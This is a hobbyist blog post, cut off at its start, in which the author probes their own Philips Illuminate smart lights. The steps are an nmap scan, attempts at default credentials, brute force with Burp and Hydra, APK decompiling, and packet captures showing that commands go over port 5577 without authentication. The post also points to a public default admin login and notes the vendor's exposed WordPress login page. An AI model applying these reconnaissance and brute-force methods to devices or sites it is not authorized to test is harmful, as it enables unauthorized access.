and provide the control box with the login to your home wifi. Once you hook the control box up to your home wifi, everything is all set for app control. The app can do A Bunch of Cool Things, including a huge amount of pre-programmed light patterns, the ability to make your own custom patterns, and a mode where the lights react to your voice... super creepy but great for the cool trick factor. \n\nThe ease of this all means the lights are absolutely worth the sale price of $79.99 (originally $99.99!), right? But it'd be nice to get them to do a little more, or at least be able to deconstruct how they work. After running through the programs available on the app, creating my own programs on the app, and poking around to see if anybody had created a custom firmware for these yet, I got to the point where I started getting a bit more curious about the security of the Philips Illuminate light set. \n\nFirst of all, if these things are on my wifi network, they've got to have an IP address and my particular starting point for poking at things on my network is to do an nmap scan:\n\n![](2018/12/image-19.jpg)\n\nChoose whatever nmap scan you want, but this one hits all the ports tcp and udp so you can get a general idea of what the network functions of this device are. From this scan, I've got the easily recognizable port 80 which indicates we can browse to http://192.168.50.37 on my home network and see what's up there. I also see a pretty neat option with port 5577, which led me down a huge rabbit hole. I've never messed with smart home devices before, but apparently port 5577 is a standard control port for issuing commands to networked LED devices with a certain set of controllers. In the UDP zone, there's port 53!! Is this thing running a DNS server? There's also those various high level UDP ports which could offer up some interesting information.\n\nIn the interest of keeping things simple, I started with the port 80 web interface. By browsing to the IP address, I got a login prompt where I tried every different formulation of admin/admin, admin/password, root/[blank]... nothing.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.24.57-AM.jpg \"a challenge\")\n\nAlso note the truly beautiful shade of pink you get upon failed login... the kind of pink that makes you want to attempt more.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.29.47-AM.jpg \"heck.\")\n\nAt this point I was pretty okay with trying anything I could to get into what I assumed was a web interface to change settings with the lights. Following t[his](https://support.portswigger.net/customer/portal/articles/1964020-using-burp-to-brute-force-a-login-page) article about using Burp to brute force a login page yielded no results. [This](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/) article about using Hydra to brute force a login page... **also** yielded no results. Double heck! \n\n***NOTE:*** Both of the brute force options would have worked if I had a certain reversed common username in any of the wordlists I used... remember to use good wordlists, pals. But I didn't, so I carried on.\n\nThe next thing I wanted to try was getting a PCAP of the app issuing commands to the lights, because maybe the password would be visible over the wire! At this point I was mistakenly assuming that the app was issuing API calls over port 80 via authenticated HTTP at the very least. I didn't have an easy way right off the bat to grab a PCAP, so I turned to asking people around me what they'd do next. We ended up decompiling the Philips Illuminate APK to try and find the password. It was a really great way to get a crash course in Android app development, but didn't yield any results HTTP login password-wise. I did get a bit more information about these lights though: the original developer is a company called Zengge and also got some model information from examining the APK. I wasn't right about the HTTP posts for the control of the lights, so on to the next option.\n\nDoing more research about port 5577 gave me the confirmation that it was time to put these things on an isolated test network just to be able to make sure nothing else was messing with them and snatch a pcap of opening my app and issuing a series of on-off commands:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.13.02-PM.jpg \"things happening over port 5577!!\")\n\nand look! Confirmation that commands are indeed issued over port 5577. But how can you confirm for absolutely certain that it's not just random chatter? Follow the streams:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.26.26-PM.jpg \"Repetitive commands being issued! Hooray!\")\n \nThat's what a series of on-off commands looks like, and here's what a series of switching between the two custom programs I made on the app look like: \n\n![](2018/12/Screen-Shot-2018-12-25-at-4.36.31-PM.png \"a bit more complex\")\n\nSo as you can see, a bit more complicated when you get into the fancy settings like color changes and fade speeds. When looking through the pcaps for different kinds of requests, there's not a whole bunch more information beyond the promise of the ability to issue totally unauthenticated commands. This makes it unnecessary to have the HTTP page login for the purposes of controlling the lights without the app, but I was still really interested in finding the password. What was that terrible pink 404 error hiding?\n\nOur next port to explore was confirmed as the one interesting artifact I found in the PCAPs I took: this controller randomly spits out the either the ip address, hostname, mac address in a string or every so often a string of \"HF-A11ASSISTHREAD\" over UDP on port 48899. \n\n![](2018/12/Screen-Shot-2018-12-26-at-1.46.48-PM.png \"a friendly network device\")\n\nThis didn't correspond with any hostnames, so I immediately threw it into Google and found out some excellent information about the Zengge Lightbulb manufacturing company thanks to [vikstrous on Github](https://github.com/vikstrous/zengge-lightcontrol). This source not only gave me some insight onto what's going on with this magical box and lights, but also the admin/password to login to the web interface (finally)!\n\nWhat is going on here anyways? What we know at this point is that there's 25 LEDs controlled by a control box. The control box has a wifi card in it which has the ability to not only broadcast but also connect to a wifi network. This card also runs a UART (Universal Asynchronous Receiver/Transmitter) that accepts commands over port 5577. The mysterious port 48899 is the ability to control some options for the device, but lucky for me the default HTTP login found on the internet for the device works!\n\n![](2018/12/Screen-Shot-2018-12-25-at-5.37.14-PM.jpg \"Answers!\")\n\nHere is where we can configure some cool information about the device's settings for sending and receiving commands, but honestly I'm not even going to touch it â since what I was really hoping for was a web interface to control the lights themselves, not really the device that controls communication to them. \n\nAn additional part of this adventure that doesn't really fit into the rest of the research is that Philips is just the distributor for this product which is made by Seasonal Specialties, a company founded in 1996. [Seasonal Specialities](http://www.seasonalspecialties.com) has a website that was created in Microsoft Frontpage 5.0 but also a [wordpress with a default login page](http://www.seasonalspecialties.com/wp/wp-login.php) operating on the same web host. Yikes. These details tell me security isn't exactly a major concern at Seasonal Specialities, yet these lights are a really nicely made product so I would like to tell them to please start caring! If you go through all of the trouble to rebrand the Zenegge light parts into something that becomes a well-constructed nicely working set of Christmas lights, why not go the extra mile and figure out how to cover up their lack of security? \n\nLuckily, I've got what I need to start creating the foundation for controlling the lights without the Philips Illuminate app. I have a model of UART Controller and lights, I know that the commands aren't sent with any authentication, and I could conceivably find a way to send commands via my Raspberry Pi or create my own web interface for their control. Simply telnetting to port 5577 and repeating the same strings observed in the PCAP back at the device doesn't really work... So now it's just a matter of finding out what packages are out there to interact with this controller or building my own. I'm also tempted to see if any of the [OpenHab](https://www.openhab.org/addons/bindings/wifiled/) extensions can play nice with these lights. Either way, I haven't really hacked my Christmas lights, I just found out a TON of information about how they work and function. The true hack will come when I find a way to make them work without their intended supporting software. \n\nThanks to some sources:\n\n[https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/](https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/)\n\n[https://github.com/renebohne/wifirgbcontroller](https://github.com/renebohne/wifirgbcontroller)\n\n[https://www.openhab.org/addons/bindings/wifiled/](https://www.openhab.org/addons/bindings/wifiled/)\n\n[https://github.com/vikstrous/zengge-lightcontrol](https://github.com/vikstrous/zengge-lightcontrol)\n"}]},"__N_SSG":true}